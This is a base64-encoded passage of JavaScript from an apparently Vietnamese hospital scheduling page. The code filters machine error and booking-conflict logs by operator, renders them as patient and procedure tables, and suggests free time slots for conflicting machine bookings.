ZXMubGVuZ3RofSIgY2xhc3M9InRpbWUtc3VnZ2VzdGlvbiIgaWQ9Im1hY2hpbmVTdWdnZXN0aW9uLSR7Y29uZmxpY3QubWFjaGluZUNvZGV9LSR7Y29uZmxpY3QuZGF0ZX0iPg0KICAgICAgICAgIA0KICAgICAgICAgICAgPC90ZD5gIDogJyd9DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0pOw0KICAgICAgICBodG1sICs9IGA8dHI+PHRkIGNvbHNwYW49IiR7c2hvd0RvY3RvciA/ICc3JyA6ICc2J30iIGNsYXNzPSJncm91cC1zZXBhcmF0b3IiPjwvdGQ+PC90cj5gOw0KICAgICAgICAvLyBUaMOqbSBkw7JuZyBwaMOibiBjw6FjaCBnaeG7r2EgY8OhYyBuaMOzbSB4dW5nIMSR4buZdA0KICAgICAgICBodG1sICs9IGA8dHI+PHRkIGNvbHNwYW49IjUiIGNsYXNzPSJncm91cC1zZXBhcmF0b3IiPjwvdGQ+PC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1hY2hpbmVDb25mbGljdExvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgIG1hY2hpbmVDb25mbGljdFNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jDQogICAgdXBkYXRlTWFjaGluZUNvbmZsaWN0T3BlcmF0b3JGaWx0ZXIoKTsNCgkNCgkgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICBnZW5lcmF0ZU1hY2hpbmVUaW1lU3VnZ2VzdGlvbnMoKTsNCiAgICB9LCAxMDApOw0KCQ0KfQ0KDQovLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMgY2hvIGzhu5dpIG3DoXkNCmZ1bmN0aW9uIHVwZGF0ZU1hY2hpbmVPcGVyYXRvckZpbHRlcigpIHsNCiAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChtYWNoaW5lRXJyb3JMb2cubWFwKGVycm9yID0+IGVycm9yLm9wZXJhdG9yKSldOw0KICAgIGNvbnN0IG9wZXJhdG9yU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVPcGVyYXRvclNlbGVjdCcpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lT3BlcmF0b3JGaWx0ZXInKS5zdHlsZS5kaXNwbGF5ID0gb3BlcmF0b3JzLmxlbmd0aCA+IDAgPyAnYmxvY2snIDogJ25vbmUnOw0KfQ0KDQovLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMgY2hvIHh1bmcgxJHhu5l0IG3DoXkNCmZ1bmN0aW9uIHVwZGF0ZU1hY2hpbmVDb25mbGljdE9wZXJhdG9yRmlsdGVyKCkgew0KICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KG1hY2hpbmVDb25mbGljdExvZy5mbGF0TWFwKGNvbmZsaWN0ID0+IA0KICAgICAgICBjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMubWFwKHByb2MgPT4gcHJvYy5vcGVyYXRvcikNCiAgICApKV07DQogICAgY29uc3Qgb3BlcmF0b3JTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QnKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArIA0KICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0T3BlcmF0b3JGaWx0ZXInKS5zdHlsZS5kaXNwbGF5ID0gb3BlcmF0b3JzLmxlbmd0aCA+IDAgPyAnYmxvY2snIDogJ25vbmUnOw0KfQ0KDQovLyBM4buNYyBs4buXaSBtw6F5IHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbg0KZnVuY3Rpb24gZmlsdGVyTWFjaGluZUVycm9yc0J5T3BlcmF0b3IoKSB7DQogICAgY29uc3Qgb3BlcmF0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZU9wZXJhdG9yU2VsZWN0JykudmFsdWU7DQogICAgY29uc3QgZmlsdGVyZWRFcnJvcnMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gbWFjaGluZUVycm9yTG9nIA0KICAgICAgICA6IG1hY2hpbmVFcnJvckxvZy5maWx0ZXIoZXJyb3IgPT4gZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpKTsNCiAgICANCiAgICBkaXNwbGF5RmlsdGVyZWRNYWNoaW5lRXJyb3JzKGZpbHRlcmVkRXJyb3JzKTsNCn0NCg0KLy8gTOG7jWMgeHVuZyDEkeG7mXQgbcOheSB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h24NCmZ1bmN0aW9uIGZpbHRlck1hY2hpbmVDb25mbGljdHNCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdE9wZXJhdG9yU2VsZWN0JykudmFsdWU7DQogICAgY29uc3QgZmlsdGVyZWRDb25mbGljdHMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gbWFjaGluZUNvbmZsaWN0TG9nIA0KICAgICAgICA6IG1hY2hpbmVDb25mbGljdExvZy5maWx0ZXIoY29uZmxpY3QgPT4gDQogICAgICAgICAgICBjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMuc29tZShwcm9jID0+IA0KICAgICAgICAgICAgICAgIHByb2Mub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpDQogICAgICAgICAgICApDQogICAgICAgICk7DQogICAgDQogICAgZGlzcGxheUZpbHRlcmVkTWFjaGluZUNvbmZsaWN0cyhmaWx0ZXJlZENvbmZsaWN0cyk7DQogICAgDQogICAgLy8gR+G7jWkgbOG6oWkgaMOgbSB04bqhbyBn4bujaSDDvSBnaeG7nSBzYXUga2hpIGzhu41jDQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGdlbmVyYXRlTWFjaGluZVRpbWVTdWdnZXN0aW9ucygpOw0KICAgIH0sIDEwMCk7DQp9DQoNCi8vIEhp4buDbiB0aOG7iyBs4buXaSBtw6F5IMSRw6MgbOG7jWMNCmZ1bmN0aW9uIGRpc3BsYXlGaWx0ZXJlZE1hY2hpbmVFcnJvcnMoZmlsdGVyZWRFcnJvcnMpIHsNCiAgICBjb25zdCBtYWNoaW5lRXJyb3JMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUVycm9yTG9nJyk7DQogICAgIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBkb2N0b3JDb2x1bW5TdHlsZSA9IHNob3dEb2N0b3IgPyAnJyA6ICdkaXNwbGF5Om5vbmUnOw0KICAgIGlmIChmaWx0ZXJlZEVycm9ycy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgbWFjaGluZUVycm9yTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIGfhuq9uIHNhaSBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQoJCQkJPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtbWljcm9jaGlwIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBNw6MgbcOheTwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIGZpbHRlcmVkRXJyb3JzLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBodG1sICs9IGANCiAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7ZXJyb3IucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wcm9jZWR1cmV9PC90ZD4NCgkJCTx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke2Vycm9yLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX0g4oaSICR7ZXJyb3IuZW5kVGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IubWFjaGluZUNvZGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZCBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9IDwhLS0gxJDDoyDEkcaw4bujYyBj4bqtcCBuaOG6rXQgduG7m2kgdGjDtG5nIGLDoW8gY+G7pSB0aOG7gyAtLT4NCiAgICAgICAgICAgIDwvdGQ+DQogICAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBtYWNoaW5lRXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCn0NCg0KLy8gSGnhu4NuIHRo4buLIHh1bmcgxJHhu5l0IG3DoXkgxJHDoyBs4buNYw0KZnVuY3Rpb24gZGlzcGxheUZpbHRlcmVkTWFjaGluZUNvbmZsaWN0cyhmaWx0ZXJlZENvbmZsaWN0cykgew0KICAgIGNvbnN0IG1hY2hpbmVDb25mbGljdExvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lQ29uZmxpY3RMb2cnKTsNCiAgICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogICAgaWYgKGZpbHRlcmVkQ29uZmxpY3RzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBtYWNoaW5lQ29uZmxpY3RMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgeHVuZyDEkeG7mXQgbcOheSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLW1pY3JvY2hpcCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTcOheTwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCgkJCQk8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQoJCQkJIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBH4bujaSDDvSBnaeG7nTwvdGg+DQoJCQkJIA0KCQkJCSANCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIGZpbHRlcmVkQ29uZmxpY3RzLmZvckVhY2goY29uZmxpY3QgPT4gew0KICAgICAgICAvLyBUaMOqbSBkw7JuZyB0aMO0bmcgdGluIHbhu4EgbcOheSB2w6AgbmfDoHkgeHVuZyDEkeG7mXQNCiAgICAgIC8vICBodG1sICs9IGANCiAgICAgIC8vICA8dHIgY2xhc3M9ImVycm9yLXJvdyIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6ICNmZmYzY2Q7Ij4NCiAgICAgICAgLy8gICAgPHRkIGNvbHNwYW49IjUiIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IGZvbnQtd2VpZ2h0OiBib2xkOyBjb2xvcjogIzg1NjQwNDsiPg0KICAgICAgICAvLyAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSI+PC9pPiANCiAgICAgICAgICAvLyAgICAgIFhVTkcgxJDhu5hUIE3DgVk6ICR7Y29uZmxpY3QubWFjaGluZUNvZGV9IC0gTkfDgFk6ICR7Y29uZmxpY3QuZGF0ZX0NCiAgICAgICAgIC8vICAgPC90ZD4NCiAgICAgIC8vICA8L3RyPmA7DQogICAgICAgIA0KICAgICAgICBjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMuZm9yRWFjaCgocHJvYywgaW5kZXgpID0+IHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgICR7aW5kZXggPT09IDAgPyBgPHRkIHJvd3NwYW49IiR7Y29uZmxpY3QuY29uZmxpY3RQcm9jZWR1cmVzLmxlbmd0aH0iPiR7Y29uZmxpY3QubWFjaGluZUNvZGV9PC90ZD5gIDogJyd9DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7cHJvYy5wYXRpZW50QWdlfTwvZm9udD5dPGJyLz4ke3Byb2MucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2NvbmZsaWN0LmRhdGV9PGJyLz4ke3Byb2MuZGlzcGxheVN0YXJ0fSDihpIgJHtwcm9jLmRpc3BsYXlFbmR9PC9jZW50ZXI+PC90ZD4NCgkJCQk8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+JHtwcm9jLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogJHtpbmRleCA9PT0gMCA/IGA8dGQgcm93c3Bhbj0iJHtjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMubGVuZ3RofSIgY2xhc3M9InRpbWUtc3VnZ2VzdGlvbiIgaWQ9Im1hY2hpbmVTdWdnZXN0aW9uLSR7Y29uZmxpY3QubWFjaGluZUNvZGV9LSR7Y29uZmxpY3QuZGF0ZX0iPg0KICAgICAgICAgICAgICAgICAgICA8IS0tIEfhu6NpIMO9IGdp4budIHPhur0gxJHGsOG7o2MgY+G6rXAgbmjhuq10IHNhdSAtLT4NCiAgICAgICAgICAgICAgICA8L3RkPmAgOiAnJ30gICAgICAgICAgDQoNCg0KCQkgIDwvdHI+YDsNCiAgICAgICAgfSk7DQogICAgICAgIGh0bWwgKz0gYDx0cj48dGQgY29sc3Bhbj0iJHtzaG93RG9jdG9yID8gJzcnIDogJzYnfSIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD48L3RyPmA7DQogDQogICAgICAgIGh0bWwgKz0gYDx0cj48dGQgY29sc3Bhbj0iNSIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD48L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWFjaGluZUNvbmZsaWN0TG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQp9DQoNCg0KLy8vR+G7o2kgw70gZ2nhu50geHVuZyDEkeG7mXQgbcOheS8vLy8vDQovLyBIw6BtIHThuqFvIGfhu6NpIMO9IGdp4budIGNobyB4dW5nIMSR4buZdCBtw6F5DQpmdW5jdGlvbiBnZW5lcmF0ZU1hY2hpbmVUaW1lU3VnZ2VzdGlvbnMoKSB7DQogICAgY29uc3QgdGltZU9wdGlvbiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXTpjaGVja2VkJykudmFsdWU7DQogICAgY29uc3Qgc3RhcnRIb3VyID0gdGltZU9wdGlvbiA9PT0gJzc6MzAnID8gNy41IDogNzsNCiAgICBjb25zdCBzaG93TW9yZVN1Z2dlc3Rpb25zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgDQogICAgLy8gU+G7kSBraHVuZyBnaeG7nSB04buRaSDEkWEgbeG7l2kgYnXhu5VpDQogICAgY29uc3QgbWF4TW9ybmluZyA9IHNob3dNb3JlU3VnZ2VzdGlvbnMgPyAzIDogMjsNCiAgICBjb25zdCBtYXhBZnRlcm5vb24gPSBzaG93TW9yZVN1Z2dlc3Rpb25zID8gMyA6IDE7DQoNCiAgICBtYWNoaW5lQ29uZmxpY3RMb2cuZm9yRWFjaChjb25mbGljdCA9PiB7DQogICAgICAgIGNvbnN0IHByb2NlZHVyZXMgPSBjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXM7DQogICAgICAgIGNvbnN0IG1hY2hpbmVDb2RlID0gY29uZmxpY3QubWFjaGluZUNvZGU7DQogICAgICAgIGNvbnN0IGRhdGUgPSBjb25mbGljdC5kYXRlOw0KICAgICAgICANCiAgICAgICAgLy8gTOG6pXkgdOG6pXQgY+G6oyB0aOG7pyB0aHXhuq10IGPDuW5nIG5nw6B5LCBjw7luZyBtw6F5DQogICAgICAgIGNvbnN0IHNhbWVNYWNoaW5lUHJvY2VkdXJlcyA9IGdldEFsbFByb2NlZHVyZXNGb3JNYWNoaW5lKG1hY2hpbmVDb2RlLCBkYXRlKTsNCiAgICAgICAgDQogICAgICAgIC8vIFTDrG0ga2h1bmcgZ2nhu50gdHLhu5FuZyBjaG8gdOG7q25nIHRo4bunIHRodeG6rXQgdHJvbmcgeHVuZyDEkeG7mXQNCiAgICAgICAgcHJvY2VkdXJlcy5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICAgICAgY29uc3QgZHVyYXRpb25TZWNvbmRzID0gcHJvYy5lbmQgLSBwcm9jLnN0YXJ0Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBUw6xtIGtodW5nIGdp4budIGJ14buVaSBzw6FuZw0KICAgICAgICAgICAgY29uc3QgbW9ybmluZ1Nsb3RzID0gZmluZEF2YWlsYWJsZU1hY2hpbmVTbG90cygNCiAgICAgICAgICAgICAgICBzdGFydEhvdXIgKiAzNjAwLCANCiAgICAgICAgICAgICAgICAxMS41ICogMzYwMCwgDQogICAgICAgICAgICAgICAgZHVyYXRpb25TZWNvbmRzLCANCiAgICAgICAgICAgICAgICBzYW1lTWFjaGluZVByb2NlZHVyZXMsDQogICAgICAgICAgICAgICAgcHJvY2VkdXJlcywgLy8gbG/huqFpIHRy4burIGPDoWMgdGjhu6cgdGh14bqtdCDEkWFuZyB4dW5nIMSR4buZdA0KICAgICAgICAgICAgICAgIG1heE1vcm5pbmcsDQogICAgICAgICAgICAgICAgcHJvYy5vcGVyYXRvciwNCiAgICAgICAgICAgICAgICBkYXRlDQogICAgICAgICAgICApOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBUw6xtIGtodW5nIGdp4budIGJ14buVaSBjaGnhu4F1DQogICAgICAgICAgICBjb25zdCBhZnRlcm5vb25TbG90cyA9IGZpbmRBdmFpbGFibGVNYWNoaW5lU2xvdHMoDQogICAgICAgICAgICAgICAgMTMuNSAqIDM2MDAsIA0KICAgICAgICAgICAgICAgIDE3ICogMzYwMCwgDQogICAgICAgICAgICAgICAgZHVyYXRpb25TZWNvbmRzLCANCiAgICAgICAgICAgICAgICBzYW1lTWFjaGluZVByb2NlZHVyZXMsDQogICAgICAgICAgICAgICAgcHJvY2VkdXJlcywNCiAgICAgICAgICAgICAgICBtYXhBZnRlcm5vb24sDQogICAgICAgICAgICAgICAgcHJvYy5vcGVyYXRvciwNCiAgICAgICAgICAgICAgICBkYXRlDQogICAgICAgICAgICApOw0KDQogICAgICAgICAgICAvLyBGb3JtYXQga+G6v3QgcXXhuqMNCiAgICAgICAgICAgIGxldCBzdWdnZXN0aW9ucyA9IFtdOw0KICAgICAgICAgICAgaWYgKG1vcm5pbmdTbG90cy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgc3VnZ2VzdGlvbnMucHVzaCgnPHN0cm9uZz5Tw6FuZzo8L3N0cm9uZz48YnI+JyArIA0KICAgICAgICAgICAgICAgICAgICBtb3JuaW5nU2xvdHMubWFwKHNsb3QgPT4gYCR7c2xvdC5zdGFydH0gLSAke3Nsb3QuZW5kfWApLmpvaW4oJzxicj4nKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoYWZ0ZXJub29uU2xvdHMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+Q2hp4buBdTo8L3N0cm9uZz48YnI+JyArIA0KICAgICAgICAgICAgICAgICAgICBhZnRlcm5vb25TbG90cy5tYXAoc2xvdCA9PiBgJHtzbG90LnN0YXJ0fSAtICR7c2xvdC5lbmR9YCkuam9pbignPGJyPicpKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy8gTMawdSBn4bujaSDDvQ0KICAgICAgICAgICAgcHJvYy5tYWNoaW5lU3VnZ2VzdGlvbiA9IHN1Z2dlc3Rpb25zLmxlbmd0aCA+IDAgPyBzdWdnZXN0aW9ucy5qb2luKCc8YnI+JykgOiANCiAgICAgICAgICAgICAgICAnPHNwYW4gY2xhc3M9Im5vLXN1Z2dlc3Rpb24iPktow7RuZyBjw7Mga2h1bmcgZ2nhu50gdHLhu5FuZzwvc3Bhbj4nOw0KICAgICAgICB9KTsNCg0KICAgICAgICAvLyBD4bqtcCBuaOG6rXQgVUkNCiAgICAgICAgdXBkYXRlTWFjaGluZVN1Z2dlc3Rpb25VSShtYWNoaW5lQ29kZSwgZGF0ZSwgcHJvY2VkdXJlcyk7DQogICAgfSk7DQp9DQoNCi8vIEjDoG0gbOG6pXkgdOG6pXQgY+G6oyB0aOG7pyB0aHXhuq10IGPDuW5nIG3DoXksIGPDuW5nIG5nw6B5DQpmdW5jdGlvbiBnZXRBbGxQcm9jZWR1cmVzRm9yTWFjaGluZShtYWNoaW5lQ29kZSwgZGF0ZSkgew0KICAgIGNvbnN0IGFsbFByb2NzID0gW107DQogICAgDQogICAgbWFjaGluZUNvbmZsaWN0TG9nLmZvckVhY2goY29uZmxpY3QgPT4gew0KICAgICAgICBpZiAoY29uZmxpY3QubWFjaGluZUNvZGUgPT09IG1hY2hpbmVDb2RlICYmIGNvbmZsaWN0LmRhdGUgPT09IGRhdGUpIHsNCiAgICAgICAgICAgIGFsbFByb2NzLnB1c2goLi4uY29uZmxpY3QuY29uZmxpY3RQcm9jZWR1cmVzKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KICAgIA0KICAgIC8vIFRow6ptIGPDoWMgdGjhu6cgdGh14bqtdCBraMO0bmcgeHVuZyDEkeG7mXQgbmjGsG5nIGPDuW5nIG3DoXksIG5nw6B5DQogICAgaWYgKHdpbmRvdy5hbGxQcm9jZWR1cmVzKSB7DQogICAgICAgIHdpbmRvdy5hbGxQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgICAgICBpZiAocHJvYy5tYWNoaW5lQ29kZSA9PT0gbWFjaGluZUNvZGUgJiYgcHJvYy5kYXRlID09PSBkYXRlKSB7DQogICAgICAgICAgICAgICAgYWxsUHJvY3MucHVzaChwcm9jKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSk7DQogICAgfQ0KICAgIA0KICAgIHJldHVybiBhbGxQcm9jczsNCn0NCg0KLy8gSMOgbSB0w6xtIGtodW5nIGdp4budIHRy4buRbmcgY2hvIG3DoXkNCmZ1bmN0aW9uIGZpbmRBdmFpbGFibGVNYWNoaW5lU2xvdHMoc3RhcnRUaW1lLCBlbmRUaW1lLCBkdXJhdGlvbiwgbWFjaGluZVByb2NlZHVyZXMsIGNvbmZsaWN0UHJvY2VkdXJlcywgbWF4U2xvdHMsIG9wZXJhdG9yLCBkYXRlKSB7DQogICAgY29uc3Qgc2xvdHMgPSBbXTsNCiAgICBsZXQgY3VycmVudFRpbWUgPSBzdGFydFRpbWU7DQogICAgDQogICAgd2hpbGUgKGN1cnJlbnRUaW1lICsgZHVyYXRpb24gPD0gZW5kVGltZSAmJiBzbG90cy5sZW5ndGggPCBtYXhTbG90cykgew0KICAgICAgICBpZiAoIWhhc01hY2hpbmVUaW1lQ29uZmxpY3QoY3VycmVudFRpbWUsIGR1cmF0aW9uLCBtYWNoaW5lUHJvY2VkdXJlcywgY29uZmxpY3RQcm9jZ